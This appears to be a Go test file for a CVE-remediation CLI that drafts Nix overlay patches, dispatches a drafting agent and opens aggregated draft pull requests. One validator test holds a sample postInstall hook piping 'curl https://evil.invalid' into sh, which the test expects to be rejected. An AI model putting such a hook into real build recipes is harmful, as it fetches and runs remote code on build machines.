package commands

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func dispatchGit(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %v failed: %v\n%s", args, err, out)
	}
}

func dispatchGitOut(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v failed: %v\n%s", args, err, out)
	}
	return strings.TrimSpace(string(out))
}

func writeExecutable(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o755); err != nil {
		t.Fatal(err)
	}
}

func TestRemediationRunScheduledCIDefaults(t *testing.T) {
	t.Setenv("GITHUB_EVENT_NAME", "schedule")
	t.Setenv("SCHEDULED_REMEDIATION_LIMIT", "2")
	t.Setenv("MAX_FINDINGS_PER_RUN", "9")
	t.Setenv("INCLUDE_DEV_ONLY_REMEDIATION", "true")
	if got := remediationRunLimitDefault(); got != 2 {
		t.Fatalf("scheduled run should prefer SCHEDULED_REMEDIATION_LIMIT, got %d", got)
	}
	if remediationRunIncludeDevOnlyDefault() {
		t.Fatal("scheduled run should force include-dev-only off")
	}
}

func TestRemediationRunRequireLLMKeyPreflight(t *testing.T) {
	t.Setenv("OPENROUTER_API_KEY", "")
	stdout, err := runCLI(t, "remediation", "run", "--require-llm-key")
	if err == nil || !strings.Contains(err.Error(), "OPENROUTER_API_KEY") {
		t.Fatalf("expected OPENROUTER_API_KEY preflight failure, got err=%v stdout=%s", err, stdout)
	}

	stdout, err = runCLI(t, "remediation", "run", "--require-llm-key", "--llm", "off")
	if err == nil || strings.Contains(err.Error(), "OPENROUTER_API_KEY") {
		t.Fatalf("llm=off should not fail on API key preflight; got err=%v stdout=%s", err, stdout)
	}
}

func TestDeterministicRecipeForCampaignSynthesizesVersionBump(t *testing.T) {
	campaign := RemediationCampaign{
		Package:      "zlib",
		CVE:          "CVE-2026-77777",
		FixedVersion: "1.3.2",
		RemediationEvidence: map[string]any{
			"source_url":    "https://example.test/zlib-1.3.2.tar.gz",
			"source_sha256": "sha256-deadbeef",
		},
	}
	recipe := deterministicRecipeForCampaign(campaign)
	if recipe == nil {
		t.Fatal("expected synthesized version-bump recipe")
	}
	expression := stringValue(recipe, "overlay_expression")
	for _, want := range []string{
		"prev.lib.versionOlder prev.zlib.version \"1.3.2\"",
		"src = prev.fetchurl",
		"url = \"https://example.test/zlib-1.3.2.tar.gz\"",
		"sha256 = \"sha256-deadbeef\"",
		"doCheck = false",
	} {
		if !strings.Contains(expression, want) {
			t.Fatalf("synthesized expression missing %q:\n%s", want, expression)
		}
	}
	if route := stringValue(recipe, "route"); route != "version_bump" {
		t.Fatalf("unexpected route %q", route)
	}
	if _, err := validateNativeRemediationRecipe(recipe, campaign); err != nil {
		t.Fatalf("synthesized version-bump recipe should validate: %v\n%#v", err, recipe)
	}
}

func TestDeterministicRecipeForCampaignSynthesizesFetchpatch(t *testing.T) {
	campaign := RemediationCampaign{
		Package: "openssl",
		CVE:     "CVE-2026-88888",
		RemediationEvidence: map[string]any{
			"patch_url":    "https://example.test/openssl-cve.patch",
			"patch_sha256": "sha256-feedface",
		},
	}
	recipe := deterministicRecipeForCampaign(campaign)
	if recipe == nil {
		t.Fatal("expected synthesized fetchpatch recipe")
	}
	expression := stringValue(recipe, "overlay_expression")
	for _, want := range []string{
		"openssl = prev.openssl.overrideAttrs",
		"patches = (old.patches or []) ++",
		"prev.fetchpatch",
		"url = \"https://example.test/openssl-cve.patch\"",
		"sha256 = \"sha256-feedface\"",
	} {
		if !strings.Contains(expression, want) {
			t.Fatalf("synthesized expression missing %q:\n%s", want, expression)
		}
	}
	if route := stringValue(recipe, "route"); route != "fetchpatch" {
		t.Fatalf("unexpected route %q", route)
	}
	if _, err := validateNativeRemediationRecipe(recipe, campaign); err != nil {
		t.Fatalf("synthesized fetchpatch recipe should validate: %v\n%#v", err, recipe)
	}
}

func TestRemediationRunLLMOffDraftsDirectRecipeNatively(t *testing.T) {
	for _, bin := range []string{"git", "bash"} {
		if _, err := exec.LookPath(bin); err != nil {
			t.Skipf("%s not available", bin)
		}
	}

	workRepo := t.TempDir()
	dispatchGit(t, workRepo, "init")
	dispatchGit(t, workRepo, "config", "user.email", "test@example.com")
	dispatchGit(t, workRepo, "config", "user.name", "Test Runner")
	if err := os.WriteFile(filepath.Join(workRepo, "README.md"), []byte("seed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dispatchGit(t, workRepo, "add", ".")
	dispatchGit(t, workRepo, "commit", "--quiet", "-m", "seed")
	dispatchGit(t, workRepo, "branch", "-M", "main")

	agentMarker := filepath.Join(t.TempDir(), "agent-called")
	agentPath := filepath.Join(t.TempDir(), "agent.sh")
	writeExecutable(t, agentPath, "#!/usr/bin/env bash\nprintf called > '"+agentMarker+"'\nexit 1\n")

	root := t.TempDir()
	finding := map[string]any{
		"id":             "CVE-2026-77777",
		"severity":       "Critical",
		"packageName":    "zlib",
		"packageVersion": "1.3.1",
		"layer":          "runtime",
		"fixedIn":        "1.3.2",
		"fixState":       "fixed",
	}
	writeRemediationScan(t, root, "v1.0.0", "python3.13-slim-amd64.json", []map[string]any{finding})
	evidencePath := filepath.Join(workRepo, "overlays", "remediation-evidence.json")
	if err := os.MkdirAll(filepath.Dir(evidencePath), 0o755); err != nil {
		t.Fatal(err)
	}
	writeCatalogJSON(t, evidencePath, map[string]any{
		"entries": []map[string]any{{
			"package":      "zlib",
			"cve":          "CVE-2026-77777",
			"fixedVersion": "1.3.2",
			"recipe": map[string]any{
				"route":             "version_bump",
				"package_attribute": "zlib",
				"fixed_version":     "1.3.2",
				"source_url":        "https://example.test/zlib-1.3.2.tar.gz",
				"overlay_expression": "zlib = prev.zlib.overrideAttrs (old: {\n" +
					"  version = \"1.3.2\";\n" +
					"  src = prev.fetchurl { url = \"https://example.test/zlib-1.3.2.tar.gz\"; sha256 = \"sha256-deadbeef\"; };\n" +
					"});",
			},
		}},
	})

	oldWd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.Chdir(oldWd)
	})
	if err := os.Chdir(workRepo); err != nil {
		t.Fatal(err)
	}

	planPath := filepath.Join(t.TempDir(), "plan.json")
	stdout, err := runCLI(t,
		"remediation", "run",
		"--vuln-root", root,
		"--core-dir", ".",
		"--agent-script", agentPath,
		"--plan-out", planPath,
		"--llm", "off",
		"--limit", "1",
		"--skip-pr",
	)
	if err != nil {
		t.Fatalf("native deterministic remediation run failed: %v\n%s", err, stdout)
	}
	if !strings.Contains(stdout, "Native deterministic remediation drafted a patch") {
		t.Fatalf("expected native deterministic path, got:\n%s", stdout)
	}
	if strings.Contains(stdout, "Dispatching retained CVE drafting backend") {
		t.Fatalf("LLM-off direct recipe should not dispatch retained backend:\n%s", stdout)
	}
	if _, err := os.Stat(agentMarker); !os.IsNotExist(err) {
		t.Fatalf("agent should not have been invoked, stat err=%v", err)
	}
	if branch := dispatchGitOut(t, workRepo, "branch", "--show-current"); branch != "cve-remediation/auto" {
		t.Fatalf("expected folded rolling branch, got %q", branch)
	}
	overlayPath := filepath.Join(workRepo, "overlays", "cve", "cve-2026-77777-zlib.nix")
	overlay, err := os.ReadFile(overlayPath)
	if err != nil {
		t.Fatalf("expected native overlay: %v", err)
	}
	if !strings.Contains(string(overlay), "Generated by clearcutt remediation run --llm off") || !strings.Contains(string(overlay), "version = \"1.3.2\"") {
		t.Fatalf("unexpected native overlay:\n%s", overlay)
	}
	evidenceRaw, err := os.ReadFile(strings.TrimSuffix(overlayPath, ".nix") + ".evidence.json")
	if err != nil {
		t.Fatalf("expected native evidence: %v", err)
	}
	var evidence map[string]any
	if err := json.Unmarshal(evidenceRaw, &evidence); err != nil {
		t.Fatalf("parse native evidence: %v\n%s", err, evidenceRaw)
	}
	if evidence["generatedBy"] != "clearcutt remediation run --llm off" || evidence["policyDecision"] == nil || evidence["validation"] == nil {
		t.Fatalf("unexpected native evidence: %#v", evidence)
	}
}

func TestRemediationRunAutoDraftsDeterministicRecipeNativelyBeforeBackend(t *testing.T) {
	for _, bin := range []string{"git", "bash"} {
		if _, err := exec.LookPath(bin); err != nil {
			t.Skipf("%s not available", bin)
		}
	}

	workRepo := t.TempDir()
	dispatchGit(t, workRepo, "init")
	dispatchGit(t, workRepo, "config", "user.email", "test@example.com")
	dispatchGit(t, workRepo, "config", "user.name", "Test Runner")
	if err := os.WriteFile(filepath.Join(workRepo, "README.md"), []byte("seed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dispatchGit(t, workRepo, "add", ".")
	dispatchGit(t, workRepo, "commit", "--quiet", "-m", "seed")
	dispatchGit(t, workRepo, "branch", "-M", "main")

	agentMarker := filepath.Join(t.TempDir(), "agent-called")
	agentPath := filepath.Join(t.TempDir(), "agent.sh")
	writeExecutable(t, agentPath, "#!/usr/bin/env bash\nprintf called > '"+agentMarker+"'\nexit 1\n")

	oldOpts := remediationRunOpts
	defer func() {
		remediationRunOpts = oldOpts
	}()
	remediationRunOpts = remediationRunFlags{
		agentScript: agentPath,
		llmMode:     "auto",
	}

	campaign := RemediationCampaign{
		Package:          "zlib",
		CVE:              "CVE-2026-77777",
		InstalledVersion: "1.3.1",
		FixedVersion:     "1.3.2",
		DeterministicRecipe: map[string]any{
			"route":             "version_bump",
			"package_attribute": "zlib",
			"fixed_version":     "1.3.2",
			"overlay_expression": "zlib = prev.zlib.overrideAttrs (old: {\n" +
				"  version = \"1.3.2\";\n" +
				"  src = prev.fetchurl { url = \"https://example.test/zlib-1.3.2.tar.gz\"; sha256 = \"sha256-deadbeef\"; };\n" +
				"});",
		},
	}

	ok, branch := executeRemediationCampaign(workRepo, campaign)
	if !ok {
		t.Fatal("expected deterministic auto campaign to draft natively")
	}
	if branch != "cve-remediation/cve-2026-77777-zlib" {
		t.Fatalf("unexpected native branch %q", branch)
	}
	if _, err := os.Stat(agentMarker); !os.IsNotExist(err) {
		t.Fatalf("agent should not have been invoked before native deterministic drafting, stat err=%v", err)
	}
	if !nonEmptyFile(filepath.Join(workRepo, "overlays", "cve", "cve-2026-77777-zlib.nix")) {
		t.Fatal("expected native overlay to be written")
	}
}

func TestRemediationRunManualLLMOffVersionBumpDraftsNatively(t *testing.T) {
	for _, bin := range []string{"git", "bash"} {
		if _, err := exec.LookPath(bin); err != nil {
			t.Skipf("%s not available", bin)
		}
	}

	workRepo := t.TempDir()
	dispatchGit(t, workRepo, "init")
	dispatchGit(t, workRepo, "config", "user.email", "test@example.com")
	dispatchGit(t, workRepo, "config", "user.name", "Test Runner")
	if err := os.WriteFile(filepath.Join(workRepo, "README.md"), []byte("seed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(workRepo, "flake.nix"), []byte("{ outputs = { self }: {}; }\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(workRepo, "lib"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(workRepo, "lib", "registry.nix"), []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dispatchGit(t, workRepo, "add", ".")
	dispatchGit(t, workRepo, "commit", "--quiet", "-m", "seed")
	dispatchGit(t, workRepo, "branch", "-M", "main")

	oldWd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.Chdir(oldWd)
	})
	if err := os.Chdir(workRepo); err != nil {
		t.Fatal(err)
	}

	planPath := filepath.Join(t.TempDir(), "manual-plan.json")
	stdout, err := runCLI(t,
		"remediation", "run",
		"--plan-out", planPath,
		"--package", "zlib",
		"--cve", "CVE-2026-77777",
		"--installed-version", "1.3.1",
		"--fixed-version", "1.3.2",
		"--download-url", "https://example.test/zlib-1.3.2.tar.gz",
		"--sha256", "sha256-deadbeef",
		"--llm", "off",
		"--skip-pr",
	)
	if err != nil {
		t.Fatalf("manual deterministic remediation run failed: %v\n%s", err, stdout)
	}
	if !strings.Contains(stdout, "Native deterministic remediation drafted a patch") {
		t.Fatalf("expected native deterministic path, got:\n%s", stdout)
	}
	if strings.Contains(stdout, "Dispatching retained CVE drafting backend") {
		t.Fatalf("LLM-off manual recipe should not dispatch retained backend:\n%s", stdout)
	}
	if branch := dispatchGitOut(t, workRepo, "branch", "--show-current"); branch != "cve-remediation/auto" {
		t.Fatalf("expected folded rolling branch, got %q", branch)
	}
	overlayPath := filepath.Join(workRepo, "overlays", "cve", "cve-2026-77777-zlib.nix")
	overlay, err := os.ReadFile(overlayPath)
	if err != nil {
		t.Fatalf("expected native overlay: %v", err)
	}
	for _, want := range []string{
		"prev.lib.versionOlder prev.zlib.version \"1.3.2\"",
		"src = prev.fetchurl",
		"doCheck = false",
	} {
		if !strings.Contains(string(overlay), want) {
			t.Fatalf("native manual overlay missing %q:\n%s", want, overlay)
		}
	}
}

func TestRemediationRunManualDispatchUsesRetainedBackendWhenNoDeterministicEvidence(t *testing.T) {
	for _, bin := range []string{"git", "bash"} {
		if _, err := exec.LookPath(bin); err != nil {
			t.Skipf("%s not available", bin)
		}
	}

	workRepo := t.TempDir()
	dispatchGit(t, workRepo, "init")
	dispatchGit(t, workRepo, "config", "user.email", "test@example.com")
	dispatchGit(t, workRepo, "config", "user.name", "Test Runner")
	if err := os.WriteFile(filepath.Join(workRepo, "README.md"), []byte("seed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dispatchGit(t, workRepo, "add", ".")
	dispatchGit(t, workRepo, "commit", "--quiet", "-m", "seed")
	dispatchGit(t, workRepo, "branch", "-M", "main")

	envLog := filepath.Join(t.TempDir(), "agent-env.txt")
	agentPath := filepath.Join(t.TempDir(), "agent.sh")
	writeExecutable(t, agentPath, `#!/usr/bin/env bash
set -e
printf '%s|%s|%s|%s|%s|%s\n' "$PACKAGE_NAME" "$CVE_ID" "$DOWNLOAD_URL" "$SHA256" "$PATCH_URL" "$PATCH_SHA256" > `+shellQuote(envLog)+`
git checkout -b cve-remediation/manual-agent >/dev/null 2>&1
mkdir -p overlays/cve
printf 'overlay\n' > overlays/cve/manual.nix
git add -A
git commit --quiet -m "manual remediation"
mkdir -p "$(dirname "$REMEDIATION_SUMMARY_PATH")"
printf '%s\n' '{"recipe":{"route":"version_bump"},"validation":[],"affected_targets":[]}' > "$REMEDIATION_SUMMARY_PATH"
`)

	oldWd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = os.Chdir(oldWd)
	})
	if err := os.Chdir(workRepo); err != nil {
		t.Fatal(err)
	}

	planPath := filepath.Join(t.TempDir(), "manual-plan.json")
	stdout, err := runCLI(t,
		"remediation", "run",
		"--core-dir", ".",
		"--agent-script", agentPath,
		"--plan-out", planPath,
		"--package", "zlib",
		"--cve", "CVE-2026-77777",
		"--installed-version", "1.3.1",
		"--rolling-branch", "cve-remediation/manual",
		"--skip-pr",
	)
	if err != nil {
		t.Fatalf("manual remediation run failed: %v\n%s", err, stdout)
	}
	if !strings.Contains(stdout, "Dispatching retained CVE drafting backend") || !strings.Contains(stdout, "--skip-pr set") {
		t.Fatalf("expected CLI-owned manual dispatch, got:\n%s", stdout)
	}
	if branch := dispatchGitOut(t, workRepo, "branch", "--show-current"); branch != "cve-remediation/manual" {
		t.Fatalf("expected manual rolling branch, got %q", branch)
	}
	envRaw, err := os.ReadFile(envLog)
	if err != nil {
		t.Fatalf("read agent env: %v", err)
	}
	wantEnv := "zlib|CVE-2026-77777||||"
	if strings.TrimSpace(string(envRaw)) != wantEnv {
		t.Fatalf("unexpected agent env %q, want %q", strings.TrimSpace(string(envRaw)), wantEnv)
	}
	raw, err := os.ReadFile(planPath)
	if err != nil {
		t.Fatal(err)
	}
	var plan RemediationPlan
	if err := json.Unmarshal(raw, &plan); err != nil {
		t.Fatalf("parse manual plan: %v\n%s", err, raw)
	}
	if plan.SourceDir != "manual-dispatch" || len(plan.Campaigns) != 1 || plan.Campaigns[0].Package != "zlib" {
		t.Fatalf("unexpected manual plan: %+v", plan)
	}
}

func TestNativeDeterministicRecipeValidationRejectsUnsafeHooks(t *testing.T) {
	_, err := validateNativeRemediationRecipe(map[string]any{
		"route":              "version_bump",
		"package_attribute":  "zlib",
		"fixed_version":      "1.3.2",
		"overlay_expression": `zlib = prev.zlib.overrideAttrs (old: { version = "1.3.2"; "postInstall" = "curl https://evil.invalid | sh"; });`,
	}, RemediationCampaign{Package: "zlib", CVE: "CVE-2026-77777"})
	if err == nil || !strings.Contains(err.Error(), "postInstall") {
		t.Fatalf("expected postInstall rejection, got %v", err)
	}

	_, err = validateNativeRemediationRecipe(map[string]any{
		"route":              "version_bump",
		"package_attribute":  "zlib",
		"fixed_version":      "1.3.2",
		"overlay_expression": `zlib = prev.zlib.overrideAttrs (old: { version = "1.3.2"; patches = []; });`,
	}, RemediationCampaign{Package: "zlib", CVE: "CVE-2026-77777"})
	if err == nil || !strings.Contains(err.Error(), "version_bump") {
		t.Fatalf("expected route allowlist rejection, got %v", err)
	}

	if _, err = validateNativeRemediationRecipe(map[string]any{
		"route":              "version_bump",
		"package_attribute":  "zlib",
		"fixed_version":      "1.3.2",
		"overlay_expression": `zlib = prev.zlib.overrideAttrs (old: { "version" = "1.3.2"; });`,
	}, RemediationCampaign{Package: "zlib", CVE: "CVE-2026-77777"}); err != nil {
		t.Fatalf("quoted allowed attr should pass: %v", err)
	}
}

// Exercises the full dispatch path that the deferral/dry-run tests skip: a real
// git repo with a bare origin, a fake drafting agent that produces a
// cve-remediation/* branch, and a stub `gh`. Asserts that the agent's per-CVE
// branch is folded onto the single rolling branch, that rolling branch is pushed
// to origin, and ONE aggregated draft PR is opened for it.
func TestRemediationRunDispatchesAgentAndOpensAggregatedPR(t *testing.T) {
	for _, bin := range []string{"git", "bash"} {
		if _, err := exec.LookPath(bin); err != nil {
			t.Skipf("%s not available", bin)
		}
	}

	workRepo := t.TempDir()
	originRepo := t.TempDir()
	binDir := t.TempDir()
	ghLog := filepath.Join(binDir, "gh-calls.txt")

	// Bare origin, then a work repo on main wired to it.
	dispatchGit(t, "", "init", "--bare", originRepo)
	dispatchGit(t, workRepo, "init")
	dispatchGit(t, workRepo, "config", "user.email", "test@example.com")
	dispatchGit(t, workRepo, "config", "user.name", "Test Runner")
	if err := os.WriteFile(filepath.Join(workRepo, "README.md"), []byte("seed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dispatchGit(t, workRepo, "add", ".")
	dispatchGit(t, workRepo, "commit", "--quiet", "-m", "seed")
	dispatchGit(t, workRepo, "branch", "-M", "main")
	dispatchGit(t, workRepo, "remote", "add", "origin", originRepo)
	dispatchGit(t, workRepo, "push", "--quiet", "origin", "main")

	// Fake drafting agent: stands in for cve-draft-agent.py by creating the
	// remediation branch, committing an overlay, and writing the summary JSON.
	agentPath := filepath.Join(binDir, "fake-agent.sh")
	writeExecutable(t, agentPath, `#!/usr/bin/env bash
set -e
git checkout -b cve-remediation/test-branch >/dev/null 2>&1
mkdir -p overlays/cve
printf 'overlay\n' > overlays/cve/patch.nix
git add -A
git commit --quiet -m "automated patch"
mkdir -p "$(dirname "$REMEDIATION_SUMMARY_PATH")"
printf '%s\n' '{"recipe":{"route":"version_bump"},"validation":[],"affected_targets":[]}' > "$REMEDIATION_SUMMARY_PATH"
`)

	// Stub gh: record the invocation and succeed, so no real PR is attempted.
	writeExecutable(t, filepath.Join(binDir, "gh"), "#!/usr/bin/env bash\nprintf '%s\\n' \"$*\" >> '"+ghLog+"'\nexit 0\n")

	root := t.TempDir()
	finding := map[string]any{
		"id":             "CVE-2026-44444",
		"severity":       "Critical",
		"packageName":    "python",
		"packageVersion": "3.13.1",
		"layer":          "runtime",
		"fixedIn":        "3.13.2",
		"fixState":       "fixed",
	}
	writeRemediationScan(t, root, "v1.0.0", "python3.13-slim-amd64.json", []map[string]any{finding})

	oldWd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	oldPath := os.Getenv("PATH")
	t.Cleanup(func() {
		_ = os.Chdir(oldWd)
		_ = os.Setenv("PATH", oldPath)
	})
	if err := os.Setenv("PATH", binDir+string(os.PathListSeparator)+oldPath); err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(workRepo); err != nil {
		t.Fatal(err)
	}

	planPath := filepath.Join(t.TempDir(), "plan.json")
	stdout, err := runCLI(t,
		"remediation", "run",
		"--vuln-root", root,
		"--core-dir", ".",
		"--agent-script", agentPath,
		"--plan-out", planPath,
		"--limit", "1",
	)
	if err != nil {
		t.Fatalf("remediation run failed: %v\n%s", err, stdout)
	}

	// Branch detection + dispatch happened, and one aggregated PR was opened.
	for _, want := range []string{"Dispatching retained CVE drafting backend", "Opening aggregated draft PR for cve-remediation/auto"} {
		if !strings.Contains(stdout, want) {
			t.Fatalf("expected %q in output, got:\n%s", want, stdout)
		}
	}

	// The single rolling branch reached origin (not the per-CVE branch).
	if remote := dispatchGitOut(t, workRepo, "ls-remote", "origin", "cve-remediation/auto"); !strings.Contains(remote, "cve-remediation/auto") {
		t.Fatalf("expected cve-remediation/auto on origin, got: %q", remote)
	}
	// The per-CVE branch was folded in and deleted, never pushed on its own.
	if remote := dispatchGitOut(t, workRepo, "ls-remote", "origin", "cve-remediation/test-branch"); strings.Contains(remote, "cve-remediation/test-branch") {
		t.Fatalf("per-CVE branch should not be pushed, but found on origin: %q", remote)
	}

	// HEAD ends on the rolling branch (overlays accumulate there across campaigns).
	if branch := dispatchGitOut(t, workRepo, "branch", "--show-current"); branch != "cve-remediation/auto" {
		t.Fatalf("expected HEAD on cve-remediation/auto, got %q", branch)
	}

	// gh was invoked to open ONE aggregated draft PR for the rolling branch.
	logBytes, err := os.ReadFile(ghLog)
	if err != nil {
		t.Fatalf("gh was never invoked: %v", err)
	}
	ghCall := string(logBytes)
	for _, want := range []string{"pr create", "--draft", "cve-remediation/auto", "--base main"} {
		if !strings.Contains(ghCall, want) {
			t.Fatalf("expected gh call to contain %q, got: %q", want, ghCall)
		}
	}
}

func TestAggregatedPRBodyUsesEvidenceScopedVerificationLanguage(t *testing.T) {
	body := aggregatedPRBody([]RemediationCampaign{{
		Package:          "zlib",
		CVE:              "CVE-2026-77777",
		InstalledVersion: "1.3.1",
		FixedVersion:     "1.3.2",
		RecommendedRoute: RouteVersionBump,
	}})
	for _, want := range []string{
		"ClearCutt remediation workflow",
		"Native deterministic drafts may include syntax validation only",
		"rebuilds and rescans successfully",
	} {
		if !strings.Contains(body, want) {
			t.Fatalf("expected body to contain %q:\n%s", want, body)
		}
	}
	for _, forbidden := range []string{
		"ClearCutt CVE Patch Drafting Agent",
		"rebuilt-and-rescanned by the agent",
	} {
		if strings.Contains(body, forbidden) {
			t.Fatalf("body should not contain %q:\n%s", forbidden, body)
		}
	}
}

// Guards the push hardening: re-pushing a remediation branch that already exists
// on origin, from a fresh single-branch clone that never tracked it, is exactly
// where bare --force-with-lease fails ("stale info"). The CLI fetches the branch
// into the tracking ref first, so the re-push succeeds.
func TestRemediationOpenPRRepushesExistingBranchFromFreshClone(t *testing.T) {
	for _, bin := range []string{"git", "bash"} {
		if _, err := exec.LookPath(bin); err != nil {
			t.Skipf("%s not available", bin)
		}
	}

	originRepo := t.TempDir()
	producer := t.TempDir()
	binDir := t.TempDir()
	ghLog := filepath.Join(binDir, "gh-calls.txt")
	branch := "cve-remediation/cve-2026-1-openssl"

	// A prior run: origin already carries the remediation branch at v1.
	dispatchGit(t, "", "init", "--bare", originRepo)
	dispatchGit(t, producer, "init")
	dispatchGit(t, producer, "config", "user.email", "p@example.com")
	dispatchGit(t, producer, "config", "user.name", "Producer")
	if err := os.WriteFile(filepath.Join(producer, "README.md"), []byte("seed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dispatchGit(t, producer, "add", ".")
	dispatchGit(t, producer, "commit", "--quiet", "-m", "seed")
	dispatchGit(t, producer, "branch", "-M", "main")
	dispatchGit(t, producer, "remote", "add", "origin", originRepo)
	dispatchGit(t, producer, "push", "--quiet", "origin", "main")
	dispatchGit(t, producer, "checkout", "-b", branch)
	if err := os.WriteFile(filepath.Join(producer, "patch.txt"), []byte("v1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dispatchGit(t, producer, "add", ".")
	dispatchGit(t, producer, "commit", "--quiet", "-m", "patch v1")
	dispatchGit(t, producer, "push", "--quiet", "origin", branch)

	// A new CI runner: fresh single-branch clone with no tracking ref for the
	// remediation branch, then a locally-recreated branch with an updated patch.
	fresh := t.TempDir()
	dispatchGit(t, "", "clone", "--quiet", "--single-branch", "--branch", "main", originRepo, fresh)
	dispatchGit(t, fresh, "config", "user.email", "ci@example.com")
	dispatchGit(t, fresh, "config", "user.name", "CI")
	dispatchGit(t, fresh, "checkout", "-b", branch)
	if err := os.WriteFile(filepath.Join(fresh, "patch.txt"), []byte("v2\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dispatchGit(t, fresh, "add", ".")
	dispatchGit(t, fresh, "commit", "--quiet", "-m", "patch v2")

	writeExecutable(t, filepath.Join(binDir, "gh"), "#!/usr/bin/env bash\nprintf '%s\\n' \"$*\" >> '"+ghLog+"'\nexit 0\n")
	oldWd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	oldPath := os.Getenv("PATH")
	t.Cleanup(func() {
		_ = os.Chdir(oldWd)
		_ = os.Setenv("PATH", oldPath)
	})
	if err := os.Setenv("PATH", binDir+string(os.PathListSeparator)+oldPath); err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(fresh); err != nil {
		t.Fatal(err)
	}

	stdout, err := runCLI(t, "remediation", "open-pr", "--branch", branch, "--package", "openssl", "--cve", "CVE-2026-1")
	if err != nil {
		t.Fatalf("open-pr re-push failed (the bug this hardening fixes): %v\n%s", err, stdout)
	}

	// origin now carries the updated patch.
	if got := dispatchGitOut(t, originRepo, "show", branch+":patch.txt"); got != "v2" {
		t.Fatalf("expected origin %s to advance to v2, got %q", branch, got)
	}
}
